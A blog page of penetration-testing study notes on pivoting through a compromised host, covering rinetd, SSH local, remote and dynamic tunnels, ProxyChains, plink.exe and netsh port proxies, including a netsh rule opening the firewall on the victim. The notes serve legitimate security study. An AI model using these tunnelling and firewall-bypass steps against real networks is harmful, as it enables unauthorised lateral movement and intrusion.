<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Study Notes - 2021/07/07"><meta name="keywords" content="Study Notes,Penetration Testing"><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>Study Notes - 2021/07/07 | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-Forwarding"><span class="toc-number">1.</span> <span class="toc-text">Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RINETD"><span class="toc-number">1.1.</span> <span class="toc-text">RINETD</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH-Tunneling"><span class="toc-number">2.</span> <span class="toc-text">SSH Tunneling</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-local-port-forwarding"><span class="toc-number">2.1.</span> <span class="toc-text">SSH local port forwarding</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH-Remote-port-forwarding"><span class="toc-number">3.</span> <span class="toc-text">SSH Remote port forwarding</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH-Dynamic-port-forwarding"><span class="toc-number">4.</span> <span class="toc-text">SSH Dynamic port forwarding</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PLINK-exe"><span class="toc-number">5.</span> <span class="toc-text">PLINK.exe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#netSH"><span class="toc-number">6.</span> <span class="toc-text">netSH</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">27</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">9</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Study Notes - 2021/07/07</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-07-07</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h1><h2 id="RINETD"><a href="#RINETD" class="headerlink" title="RINETD"></a>RINETD</h2><p>Default configuration file: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;rinetd.conf</span><br></pre></td></tr></table></figure>

<p>bind address, bind port: listening address/port  connect address/port: destination  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bindadress bindport connectaddress connectport</span><br><span class="line">0.0.0.0 80 216.58.207.142 80</span><br></pre></td></tr></table></figure>
<p>forword any connection to port 80 to google  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo service rinetd restart</span><br><span class="line">ss -antp | grep &quot;80&quot;</span><br><span class="line">nc -nvv 10.11.0.4 80</span><br></pre></td></tr></table></figure>

<h1 id="SSH-Tunneling"><a href="#SSH-Tunneling" class="headerlink" title="SSH Tunneling"></a>SSH Tunneling</h1><h2 id="SSH-local-port-forwarding"><a href="#SSH-local-port-forwarding" class="headerlink" title="SSH local port forwarding"></a>SSH local port forwarding</h2><p>Senario:<br>victim1 already compromised, only accpet 8080, 22, 3389 port from outside. victim1 conenct to another subnetwork contains another target. Move tools to victim1 is not eligent and scalable, want to attack from our kali machine  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-L local_socket:host:hostport</span><br><span class="line">-L local_socket:remote_socket</span><br><span class="line">             Specifies that connections to the given TCP port or Unix socket</span><br><span class="line">             on the local (client) host are to be forwarded to the given host</span><br><span class="line">             and port, or Unix socket, on the remote side.  This works by al‐</span><br><span class="line">             locating a socket to listen to either a TCP port on the local</span><br><span class="line">             side, optionally bound to the specified bind_address, or to a</span><br><span class="line">             Unix socket.  Whenever a connection is made to the local port or</span><br><span class="line">             socket, the connection is forwarded over the secure channel, and</span><br><span class="line">             a connection is made to either host port hostport, or the Unix</span><br><span class="line">             socket remote_socket, from the remote machine.</span><br><span class="line"></span><br><span class="line">-N      Do not execute a remote command.  This is useful for just for‐</span><br><span class="line">             warding ports.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In our scenario, we want to forward port 445 (Microsoft networking without NetBIOS) on our Kali</span><br><span class="line">machine to port 445 on the Windows Server 2016 target. When we do this, any Microsoft file</span><br><span class="line">sharing queries directed at our Kali machine will be forwarded to our Windows Server 2016 target.</span><br><span class="line">This seems impossible given that the firewall is blocking traffic on TCP port 445, but this port</span><br><span class="line">forward is tunneled through an SSH session to our Linux target on port 22, which is allowed</span><br><span class="line">through the firewall. In summary, the request will hit our Kali machine on port 445, will be</span><br><span class="line">forwarded across the SSH session, and will then be passed on to port 445 on the Windows Server</span><br><span class="line">2016 target.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128</span><br></pre></td></tr></table></figure>

<h1 id="SSH-Remote-port-forwarding"><a href="#SSH-Remote-port-forwarding" class="headerlink" title="SSH Remote port forwarding"></a>SSH Remote port forwarding</h1><p>Senario:  </p>
<p>the firewall is blocking inbound TCP port 22 (SSH) connections, so we can’t<br>SSH into this server from our Internet-connected Kali machine</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim1: ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4</span><br></pre></td></tr></table></figure>

<p>forword all 10.11.0.4:2221 request from kali machien to 127.0.0.1:3306</p>
<p>on kali:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000039s latency).</span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">2221&#x2F;tcp open mysql MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds</span><br></pre></td></tr></table></figure>

<p>scan local port will scan target host  </p>
<h1 id="SSH-Dynamic-port-forwarding"><a href="#SSH-Dynamic-port-forwarding" class="headerlink" title="SSH Dynamic port forwarding"></a>SSH Dynamic port forwarding</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali&gt; ssh -N -D &lt;address to bind to&gt;:&lt;port to bind to&gt; &lt;username&gt;@&lt;SSH server address&gt;</span><br></pre></td></tr></table></figure>
<p>With the above syntax in mind, we can create a local SOCKS4 application proxy (-N -D) on our<br>Kali Linux machine on TCP port 8080 (127.0.0.1:8080), which will tunnel all incoming traffic to<br>any host in the target network, through the compromised Linux machine, which we log into as<br>student</p>
<p>We can run any network application through HTTP, SOCKS4, and SOCKS5<br>proxies with the help of ProxyChains</p>
<p>add to <code>/etc/proxychains.conf</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks4 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains nmap --top-ports&#x3D;20 -sT -Pn 192.168.1.110</span><br></pre></td></tr></table></figure>

<h1 id="PLINK-exe"><a href="#PLINK-exe" class="headerlink" title="PLINK.exe"></a>PLINK.exe</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</span><br></pre></td></tr></table></figure>
<p>if it is the first time, it will attmpt to cache the host key and there’s a interactive step y/n</p>
<p>solution: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4</span><br></pre></td></tr></table></figure>

<h1 id="netSH"><a href="#netSH" class="headerlink" title="netSH"></a>netSH</h1><p>use netsh to do port forwarding on windows, it is installed on windows by default. </p>
<p>However, for this to work, the Windows system must have the IP Helper service running and IPv6<br>support must be enabled for the interface we want to use. Fortunately, both are on and enabled<br>by default on Windows operating systems.  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport&#x3D;4455 listenaddress&#x3D;10.11.0.22 connectport&#x3D;445 connectaddress&#x3D;192.168.1.110</span><br><span class="line">netstat -anp TCP | find &quot;4455&quot; </span><br></pre></td></tr></table></figure>

<p>By default, firewall does not allow inbound connection to 4455, however, we have system privilege, we can change the firewall configuration  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;forward_port_rule&quot; protocol&#x3D;TCP dir&#x3D;in localip&#x3D;10.11.0.22 localport&#x3D;4455 action&#x3D;allow</span><br></pre></td></tr></table></figure>

<p>before using smbclient, smb need to be configured with min protocal level = smbv2 and restart </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;samba&#x2F;smb.conf</span><br><span class="line">min protocol &#x3D; SMB2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;smbd restart</span><br><span class="line">smbclient -L 10.11.0.22 --port&#x3D;4455 --user&#x3D;Administrator</span><br></pre></td></tr></table></figure>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gavin Cui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gavincrz.github.io/2021/07/08/Study-Notes-2021-07-07/">https://gavincrz.github.io/2021/07/08/Study-Notes-2021-07-07/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Study-Notes/">Study Notes</a><a class="post-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/07/09/Study-Notes-2021-07-08/"><i class="fa fa-chevron-left">  </i><span>Study Notes - 2021/07/08</span></a></div><div class="next-post pull-right"><a href="/2021/07/07/Study-Notes-2021-07-06/"><span>Study Notes - 2021/07/06</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By Gavin Cui</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>